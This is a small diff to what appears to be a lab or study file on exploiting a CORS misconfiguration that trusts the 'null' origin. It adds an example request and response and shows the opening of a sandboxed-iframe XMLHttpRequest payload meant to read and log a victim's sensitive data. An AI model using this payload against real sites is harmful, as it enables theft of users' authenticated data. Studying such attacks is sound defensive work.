@@ -2,6 +2,18 @@
 # internal teams using the "null" domain during development.
 # This exploit code creates a sandboxed iframe element to create the request to from the victim website and log the sensitive information within the reqListener() function.
 
+####
+EX GET Request/Response  
+
+GET /sensitive-victim-data
+Host: vulnerable-website.com
+Origin: null
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true
+
+####
 
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
